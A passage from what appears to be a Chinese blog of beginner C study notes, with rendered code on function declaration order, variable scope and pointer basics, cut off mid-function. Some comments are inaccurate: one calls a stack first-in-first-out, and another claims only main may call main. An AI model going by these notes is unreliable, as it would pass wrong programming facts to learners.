class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"func.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">before_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是函数测试，在主函数之前定义的。"</span>);</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义写在主函数之前的时候，那么就无需在主函数里面声明这个函数，只需要把函数体写在主函数前即可</span></span><br><span class="line"><span class="comment">//否则，需要先声明.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此函数定义在主函数之前，直接调用即可，无须声明</span></span><br><span class="line"><span class="comment">//before_func();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在主函数之后定义的，需要先声明才能调用。</span></span><br><span class="line"><span class="comment">//1.声明(要放在main外面，我放在了自定义的头文件里面)</span></span><br><span class="line"><span class="comment">//2.调用</span></span><br><span class="line"><span class="comment">//after_func();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 求最大值</span></span><br><span class="line"><span class="comment">//int i,j;</span></span><br><span class="line"><span class="comment">//i=5;j=10;</span></span><br><span class="line"><span class="comment">//get_max(i, j);</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">get_max(i,i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">after_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是函数测试，在主函数之后定义的，需要先声明才能调用。"</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//求最大值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> max_val = a&gt;b?a:b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d和%d比较，最大值为: %d \n"</span>, a,b,max_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">return和break的区别：</span></span><br><span class="line"><span class="comment">1.break:循环、switch</span></span><br><span class="line"><span class="comment">2.return终止函数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">函数的分类：</span></span><br><span class="line"><span class="comment">1.有参函数和无参函数</span></span><br><span class="line"><span class="comment">2.有返回值和无返回值</span></span><br><span class="line"><span class="comment">3.库函数和用户自定义函数</span></span><br><span class="line"><span class="comment">4.普通函数和主函数(main)：一个程序只能有一个主函数，主函数既是程序的入口，也是程序的出口</span></span><br><span class="line"><span class="comment">主函数能调用主函数，其他函数不能调用main函数，普通函数可以相互调用</span></span><br><span class="line"><span class="comment">5.值传递和引用传递(其实这样说是不对的)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如何在软件开发中，合理的设计函数来解决实际问题：</span></span><br><span class="line"><span class="comment">功能划分的详细一些，提高利用率</span></span><br><span class="line"><span class="comment">函数是C语言的基本单位，类是Java，C#等的基本单位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">常用的系统函数:</span></span><br><span class="line"><span class="comment">1. doulbe sqrt(double x)           求x的平方根</span></span><br><span class="line"><span class="comment">2. int abs(int x)   求整数的绝对值</span></span><br><span class="line"><span class="comment">3. double fabs(double x)       </span></span><br><span class="line"><span class="comment">推荐书籍：</span></span><br><span class="line"><span class="comment">机械工业出版社：《turboc2.0使用大全》</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">递归：</span></span><br><span class="line"><span class="comment">栈：先进先出</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">变量的作用于和存储方式：</span></span><br><span class="line"><span class="comment">1.按作用域分：全局变量，局部变量（函数内部定义的变量/函数的形参）</span></span><br><span class="line"><span class="comment">2.按变量的存储方式：静态变量，自动变量，寄存器变量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> k=<span class="number">99</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_var</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//局部变量与全局变量命名相同：局部变量会屏蔽掉全局变量</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><p>test.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base_pointer</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchange_two</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange1</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange2</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange3</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">two_pointer</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo3</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo4</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo5</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo6</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"test.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//base_pointer();</span></span><br><span class="line">exchange_two();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> * q; <span class="comment">// q是变量名, int *表示q变量存放的是int类型变量的地址（int * 是数据类型）</span></span><br><span class="line"><span class="comment">// 错误写法：q=55;   后面不能是值，只能跟地址</span></span><br><span class="line">q=&amp;j;   <span class="comment">//*q与j是等同的</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.q保存了j的地址，引起：q指向j。</span></span><br><span class="line"><span class="comment">2.q不是j，j不是q。修改q的值不会影响j,修改j的值也不会影响q的值</span></span><br><span class="line"><span class="comment">3.如果一个指针变量指向一个普通变量，则*指针变量完全等同于普通变量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">指针：就是地址，地址就是指针</span></span><br><span class="line"><span class="comment">指针变量：存放地址的变量</span></span><br><span class="line"><span class="comment">两者不是一个概念</span></span><br><span class="line"><span class="comment">但是，通常在叙述中，会把指针变量简称为指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一级指针</span></span><br><span class="line">    <span class="comment">// 指针的本质： 存地址(内存单元的编号)，间接访问</span></span><br><span class="line">    <span class="comment">// 指针使用场景：</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &amp; 取地址操作符/【引用】</span></span><br><span class="line">    <span class="comment">// * 取值操作符/【解引用】</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">指针的重要性;</span></span><br><span class="line"><span class="comment">表示一些复杂的数据结构;</span></span><br><span class="line"><span class="comment">快速的传递数据</span></span><br><span class="line"><span class="comment">使函数返回一个以上的值</span></span><br><span class="line"><span class="comment">能直接访问硬件</span></span><br><span class="line"><span class="comment">能方便的处理字符串</span></span><br><span class="line"><span class="comment">是理解面向对象语言中引用的基础</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//地址：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">内存单元的编号</span></span><br><span class="line"><span class="comment">从零开始的非负整数</span></span><br><span class="line"><span class="comment">范围：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//指针：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">指针就是地址，地址就是指针</span></span><br><span class="line"><span class="comment">指针变量就是存放内存单元的变量，</span></span><br><span class="line"><span class="comment">两者不是一个概念</span></span><br><span class="line"><span class="comment">但是，通常在叙述中，会把指针变量简称为指针</span></span><br><span class="line"><span class="comment">指针的本质就是一个操作受限的非负整数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//指针的分类：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.基本类型的指针</span></span><br><span class="line"><span class="comment">int *p;</span></span><br><span class="line"><span class="comment">int i=10;</span></span><br><span class="line"><span class="comment">int j;</span></span><br><span class="line"><span class="comment">p = &amp;i;</span></span><br><span class="line"><span class="comment">i=*p;</span></span><br><span class="line"><span class="comment">printf("%d",j);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">例子，见函数base_pointer</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base_pointer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line"><span class="keyword">int</span> *q;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*p = i; //【错误】，*p代表的是p指向的地址的变量的值，p现在指向的垃圾值(还没有初始化)</span></span><br><span class="line"><span class="comment">//应该这样</span></span><br><span class="line">p = &amp;i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*q=p;  //【错误】，有语法错误，*q是整形，p是int*类型</span></span><br><span class="line"><span class="comment">//*q =  *p; //【错误】,语法没错，但是q指向垃圾值（没初始化）</span></span><br><span class="line"><span class="comment">//应该这样：</span></span><br><span class="line"><span class="comment">//p=q;  // 【错误】，q赋给p，p也变成垃圾值</span></span><br><span class="line"><span class="comment">//printf("%d\n", *p);  // q的空间是属于本程序的，所以本程序可以读写q的内容，但是如果q的内部是垃圾值，则本程序不能读写*p的内容,因为*q所代表的的内存单元的控制权限并没有分配给本程序</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针变量的运算：</span></span><br><span class="line"><span class="comment">// 指针变量不能相加、相乘、相除（能相减：如果两个指针变量指向的是【同一块连续空间中的不同存储单元】）</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">p = &amp;a[1];</span></span><br><span class="line"><span class="comment">q = &amp;a[3];</span></span><br><span class="line"><span class="comment">printf("%d", q-p);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//指针的偏移</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[N]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    p = &amp;a[<span class="number">4</span>];  <span class="comment">// 指向a最后一个元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++)     <span class="comment">// 指针偏移</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%3d"</span>, *(p-i));     <span class="comment">// p +sizeof(int)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指针与自增</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">3</span>]=&#123;<span class="number">2</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">    <span class="keyword">int</span> 